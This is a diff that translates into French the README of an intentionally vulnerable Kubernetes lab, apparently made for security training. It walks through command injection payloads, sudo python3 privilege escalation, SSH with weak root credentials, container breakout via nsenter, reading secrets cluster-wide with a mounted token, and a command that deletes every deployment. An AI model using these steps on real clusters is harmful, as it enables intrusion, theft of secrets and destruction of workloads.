@@ -1,121 +1,128 @@
-# Vulnerable Kubernetes Cluster Scenario
+# Scénario de Cluster Kubernetes Vulnérable
 
-This project sets up a Kubernetes cluster environment designed to demonstrate a multi-step attack path, illustrating common vulnerabilities and misconfigurations.
+Ce projet met en place un environnement de cluster Kubernetes conçu pour démontrer un chemin d'attaque en plusieurs étapes, illustrant des vulnérabilités et des mauvaises configurations courantes.
 
-**Scenario Goal:** Deploy a cluster with intentional vulnerabilities, allowing an attacker to move from an exposed web service to full cluster compromise.
+**Objectif du Scénario :** Déployer un cluster avec des vulnérabilités intentionnelles, permettant à un attaquant de passer d'un service web exposé à une compromission complète du cluster.
 
-**Architecture:**
+**Architecture :**
 
 *   **Pod 1 (`pod1-webapp`)**:
-    *   Runs a Flask web application accessible from outside the cluster (via NodePort).
-    *   Vulnerable to **Command Injection** via a `/ping` endpoint.
-    *   Runs as `appuser`, but has `sudo NOPASSWD` configured for `/usr/bin/python3`, enabling **Privilege Escalation** within the container.
-    *   Network Policy allows egress *only* to Pod 2 on port 22.
+    *   Exécute une application web Flask accessible depuis l'extérieur du cluster (via NodePort).
+    *   Vulnérable à l'**Injection de Commandes** via un endpoint `/ping`.
+    *   S'exécute en tant que `appuser`, mais a `sudo NOPASSWD` configuré pour `/usr/bin/python3`, permettant l'**Escalade de Privilèges** dans le conteneur.
+    *   La Network Policy autorise la sortie (*egress*) *uniquement* vers le Pod 2 sur le port 22.
 *   **Pod 2 (`pod2-ssh`)**:
-    *   Runs an SSH server, accessible *only* from Pod 1 (via ClusterIP service and Network Policy).
-    *   Allows root login via SSH with a **weak password** (`root:password123`).
-    *   Runs as a **privileged container** (`securityContext.privileged: true`) and with `hostPID: true`, enabling **Pod Escape / Container Breakout**.
-    *   Uses a `ServiceAccount` (`cluster-admin-sa`) bound to a `ClusterRole` (`cluster-admin-role`) with overly permissive `* * *` permissions, enabling **Cluster Takeover**.
-*   **Network Policies**: Enforce the intended communication flow: External -> Pod 1 -> Pod 2.
+    *   Exécute un serveur SSH, accessible *uniquement* depuis le Pod 1 (via un service ClusterIP et une Network Policy).
+    *   Autorise la connexion root via SSH avec un **mot de passe faible** (`root:password123`).
+    *   S'exécute en tant que **conteneur privilégié** (`securityContext.privileged: true`) et avec `hostPID: true`, permettant l'**Évasion de Pod / Sortie de Conteneur**.
+    *   Utilise un `ServiceAccount` (`cluster-admin-sa`) lié à un `ClusterRole` (`cluster-admin-role`) avec des permissions excessivement permissives (`* * *`), permettant la **Prise de Contrôle du Cluster**.
+*   **Network Policies** : Forcent le flux de communication prévu : Externe -> Pod 1 -> Pod 2.
 
-## Prerequisites
+## Prérequis
 
-*   Docker installed and running.
-*   `kubectl` installed.
-*   A running Kubernetes cluster (e.g., Docker Desktop Kubernetes, Minikube, OrbStack, k3d, etc.). Ensure `kubectl` is configured to point to your target cluster.
+*   Docker installé et en cours d'exécution.
+*   `kubectl` installé.
+*   Un cluster Kubernetes en cours d'exécution (par exemple, Docker Desktop Kubernetes, Minikube, OrbStack, k3d, etc.). Assurez-vous que `kubectl` est configuré pour pointer vers votre cluster cible.
 
-## Setup Instructions
+## Instructions d'Installation
 
-1.  **Clone the Repository (if applicable):**
+0.  **Démarrer Minikube (si utilisé) :**
+    Si vous utilisez Minikube avec le driver Docker, démarrez-le et configurez votre shell pour utiliser le démon Docker de Minikube. Cela garantit que les images construites localement sont disponibles pour le cluster Minikube.
     ```bash
-    # git clone <repository-url>
-    # cd <repository-directory>
+    minikube start --driver=docker
+    eval $(minikube docker-env)
+    ```
+    *(Si vous utilisez un autre environnement Kubernetes comme Docker Desktop ou OrbStack, cette étape n'est généralement pas nécessaire car ils partagent l'environnement Docker de l'hôte.)*
+
+1.  **Cloner le Dépôt (si applicable) :**
+    ```bash
+    # git clone <url-du-depot>
+    # cd <repertoire-du-depot>
     ```
 
-2.  **Build Docker Images:**
-    Build the images for the two pods locally.
+2.  **Construire les Images Docker :**
+    Construisez localement les images pour les deux pods.
     ```bash
     docker build -t vulnerable-webapp:latest pod1-webapp-src/
     docker build -t ssh-server:latest pod2-ssh-server-src/
     ```
-    *(Note: If your Kubernetes cluster doesn't automatically use your local Docker daemon's images (e.g., a remote cluster), you would need to push these images to a registry accessible by the cluster and update the image names in the `k8s/*.yaml` files.)*
+    *(Note : Si votre cluster Kubernetes n'utilise pas automatiquement les images de votre démon Docker local (par exemple, un cluster distant), vous devrez pousser ces images vers un registre accessible par le cluster et mettre à jour les noms d'images dans les fichiers `k8s/*.yaml`.)*
 
-3.  **Deploy to Kubernetes:**
-    Apply all the Kubernetes manifest files located in the `k8s` directory.
+3.  **Déployer sur Kubernetes :**
+    Appliquez tous les fichiers manifestes Kubernetes situés dans le répertoire `k8s`.
     ```bash
     kubectl apply -f k8s/
     ```
 
-4.  **Verify Deployment:**
-    Check that the pods are running and the services are created.
+4.  **Vérifier le Déploiement :**
+    Vérifiez que les pods s'exécutent et que les services sont créés.
     ```bash
     kubectl get pods -o wide
     kubectl get services
     ```
-    You should see `pod1-webapp-<hash>` and `pod2-ssh-<hash>` pods in the `Running` state. Note the NodePort assigned to `pod1-webapp-service` (e.g., `3xxxx`).
+    Vous devriez voir les pods `pod1-webapp-<hash>` et `pod2-ssh-<hash>` à l'état `Running`. Notez le NodePort assigné à `pod1-webapp-service` (par exemple, `3xxxx`).
 
-## Exploitation Path
+## Chemin d'Exploitation
 
-1.  **Access Web App (Pod 1):**
-    Open your browser and navigate to `http://<NODE_IP>:<NODE_PORT>` or `http://localhost:<NODE_PORT>` if using Docker Desktop/OrbStack. (Replace `<NODE_PORT>` with the port noted in step 4 of Setup).
+1.  **Accéder à l'Application Web (Pod 1) :**
+    Ouvrez votre navigateur et naviguez vers `http://<IP_DU_NODE>:<NODE_PORT>` ou `http://localhost:<NODE_PORT>` si vous utilisez Docker Desktop/OrbStack. (Remplacez `<NODE_PORT>` par le port noté à l'étape 4 de l'Installation).
 
-2.  **Command Injection (Pod 1):**
-    Use the "Host to ping" input or manipulate the URL to inject commands.
-    *   Example: `http://localhost:<NODE_PORT>/ping?host=127.0.0.1; id`
-    *   Goal: Get command execution as the `appuser`. Try `ls /`, `whoami`, `cat /etc/passwd`.
+2.  **Injection de Commandes (Pod 1) :**
+    Utilisez le champ "Host to ping" ou manipulez l'URL pour injecter des commandes.
+    *   Exemple : `http://localhost:<NODE_PORT>/ping?host=127.0.0.1; id`
+    *   Objectif : Obtenir l'exécution de commandes en tant que `appuser`. Essayez `ls /`, `whoami`, `cat /etc/passwd`.
 
-3.  **Privilege Escalation (Pod 1):**
-    Abuse the `sudo NOPASSWD` configuration for python3. Inject a command that uses `sudo python3` to execute code as root within the container.
-    *   Example Payload for URL: `127.0.0.1; sudo python3 -c 'import os; os.system("id")'`
-    *   Get a root shell: `127.0.0.1; sudo python3 -c 'import os; os.system("/bin/bash")'` (Note: This interactive shell might be tricky via web requests, often you'd establish a reverse shell here).
+3.  **Escalade de Privilèges (Pod 1) :**
+    Abusez de la configuration `sudo NOPASSWD` pour python3. Injectez une commande qui utilise `sudo python3` pour exécuter du code en tant que root dans le conteneur.
+    *   Exemple de Payload pour l'URL : `127.0.0.1; sudo python3 -c 'import os; os.system("id")'`
+    *   Obtenir un shell root : `127.0.0.1; sudo python3 -c 'import os; os.system("/bin/bash")'` (Note : Ce shell interactif peut être délicat via les requêtes web, souvent on établirait un reverse shell ici).
 
-4.  **Network Discovery (Find Pod 2):**
-    From your root shell/command execution on Pod 1, find Pod 2's internal IP address.
-    *   The internal service name is `pod2-ssh-service`. DNS should resolve this within the cluster.
-    *   Try pinging it: `ping pod2-ssh-service`
-    *   Or use network scanning tools (if installed or installable): `apt-get update && apt-get install -y iproute2 net-tools nmap; ip a; nmap <CLUSTER_IP_RANGE>` (Find range via `ip a`).
-    *   Alternatively, check environment variables or service discovery mechanisms if available. The service IP was listed by `kubectl get svc` as well (`pod2-ssh-service` `CLUSTER-IP`). Let's assume it's `192.168.194.218` based on earlier output.
+4.  **Découverte Réseau (Trouver Pod 2) :**
+    Depuis votre shell root / exécution de commandes sur le Pod 1, trouvez l'adresse IP interne du Pod 2.
+    *   Le nom du service interne est `pod2-ssh-service`. Le DNS devrait le résoudre dans le cluster.
+    *   Essayez de le pinger : `ping pod2-ssh-service`
+    *   Ou utilisez des outils d'analyse réseau (si installés ou installables) : `apt-get update && apt-get install -y iproute2 net-tools nmap; ip a; nmap <PLAGE_IP_CLUSTER>` (Trouvez la plage via `ip a`).
+    *   Alternativement, vérifiez les variables d'environnement ou les mécanismes de découverte de service si disponibles. L'IP du service a été listée par `kubectl get svc` également (`pod2-ssh-service` `CLUSTER-IP`). Supposons que c'est `192.168.194.218` basé sur la sortie précédente.
 
-5.  **Lateral Movement (SSH to Pod 2):**
-    SSH into Pod 2 using the weak root credentials (`root` / `password123`). You might need to install an SSH client on Pod 1 first (`apt-get update && apt-get install -y openssh-client`).
+5.  **Mouvement Latéral (SSH vers Pod 2) :**
+    Connectez-vous en SSH au Pod 2 en utilisant les identifiants root faibles (`root` / `password123`). Vous devrez peut-être d'abord installer un client SSH sur le Pod 1 (`apt-get update && apt-get install -y openssh-client`).
     ```bash
-    # From root shell on Pod 1
-    ssh root@<POD_2_IP_or_SERVICE_NAME> 
-    # Enter password: password123
+    # Depuis le shell root sur Pod 1
+    ssh root@<IP_POD_2_ou_NOM_SERVICE> 
+    # Entrez le mot de passe : password123
     ```
-    You should now have a root shell on Pod 2.
+    Vous devriez maintenant avoir un shell root sur le Pod 2.
 
-6.  **Pod Escape / Container Breakout (From Pod 2):**
-    Pod 2 is running as privileged (`privileged: true`) and with `hostPID: true`. This allows accessing host resources. There are many techniques, here are a few concepts:
-    *   **Access Host Processes:** Since `hostPID` is true, `ps aux` inside the container shows *host* processes. You might find sensitive information or processes to interact with.
-    *   **Access Host Filesystem:** Privileged containers can often mount host devices (`fdisk -l` might show host disks) or find ways to access the host filesystem, potentially via `/proc/<host_pid>/root/`.
-    *   **Create Privileged Host Pod:** Use the mounted service account token (see next step) to create a new pod directly on the host network/namespace with host mounts.
-    *   **Execute Command on Host:** Find the host's PID 1 (init process) via `ps aux`, then use `nsenter` to enter the host's namespaces and execute commands: `nsenter --target <HOST_PID_1> --mount --uts --ipc --net --pid <command>`.
+6.  **Évasion de Pod / Sortie de Conteneur (Depuis Pod 2) :**
+    Le Pod 2 s'exécute en tant que privilégié (`privileged: true`) et avec `hostPID: true`. Cela permet d'accéder aux ressources de l'hôte. Il existe de nombreuses techniques, voici quelques concepts :
+    *   **Accéder aux Processus Hôtes :** Puisque `hostPID` est vrai, `ps aux` à l'intérieur du conteneur montre les processus de l'*hôte*. Vous pourriez trouver des informations sensibles ou des processus avec lesquels interagir.
+    *   **Accéder au Système de Fichiers Hôte :** Les conteneurs privilégiés peuvent souvent monter les périphériques hôtes (`fdisk -l` pourrait montrer les disques hôtes) ou trouver des moyens d'accéder au système de fichiers hôte, potentiellement via `/proc/<pid_hote>/root/`.
+    *   **Créer un Pod Hôte Privilégié :** Utilisez le token de compte de service monté (voir étape suivante) pour créer un nouveau pod directement sur le réseau/namespace de l'hôte avec des montages hôtes.
+    *   **Exécuter une Commande sur l'Hôte :** Trouvez le PID 1 de l'hôte (processus init) via `ps aux`, puis utilisez `nsenter` pour entrer dans les namespaces de l'hôte et exécuter des commandes : `nsenter --target <PID_1_HOTE> --mount --uts --ipc --net --pid <commande>`.
 
-7.  **Cluster Takeover (From Pod 2):**
-    The ServiceAccount token for `cluster-admin-sa` is mounted into Pod 2 (usually at `/var/run/secrets/kubernetes.io/serviceaccount/token`). This account is bound to `cluster-admin-role` with `* * *` permissions.
-    *   Install `kubectl` inside Pod 2 (`apt-get update && apt-get install -y kubectl`).
-    *   Use the mounted token to interact with the Kubernetes API as cluster-admin:
+7.  **Prise de Contrôle du Cluster (Depuis Pod 2) :**
+    Le token du ServiceAccount `cluster-admin-sa` est monté dans le Pod 2 (généralement à `/var/run/secrets/kubernetes.io/serviceaccount/token`). Ce compte est lié au `ClusterRole` `cluster-admin-role` avec les permissions `* * *`.
+    *   Installez `kubectl` à l'intérieur du Pod 2 (`apt-get update && apt-get install -y kubectl`).
+    *   Utilisez le token monté pour interagir avec l'API Kubernetes en tant que cluster-admin :
         ```bash
-        # Inside Pod 2 shell
+        # Dans le shell du Pod 2
         TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
         CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
-        APISERVER=https://kubernetes.default.svc # Default internal API server address
+        APISERVER=https://kubernetes.default.svc # Adresse interne par défaut du serveur API
 
-        # Test access
+        # Tester l'accès
         kubectl --server=$APISERVER --token=$TOKEN --certificate-authority=$CACERT get nodes
         kubectl --server=$APISERVER --token=$TOKEN --certificate-authority=$CACERT get secrets --all-namespaces 
-        # You now have full control over the cluster!
+        # Vous avez maintenant le contrôle total du cluster !
         ```
-    *   Simulate shutdown: `kubectl --server=$APISERVER --token=$TOKEN --certificate-authority=$CACERT delete deployment --all --all-namespaces` (Don't run this unless intended!)
+    *   Simuler l'arrêt : `kubectl --server=$APISERVER --token=$TOKEN --certificate-authority=$CACERT delete deployment --all --all-namespaces` (Ne pas exécuter sauf si intentionnel !)
 
-## Cleanup
+## Nettoyage
 
-To remove all the resources created by this scenario:
+Pour supprimer toutes les ressources créées par ce scénario :
 ```bash
 kubectl delete -f k8s/
 ```
-You may also want to remove the Docker images:
+Vous pouvez également vouloir supprimer les images Docker :
 ```bash
 docker rmi vulnerable-webapp:latest ssh-server:latest
-```
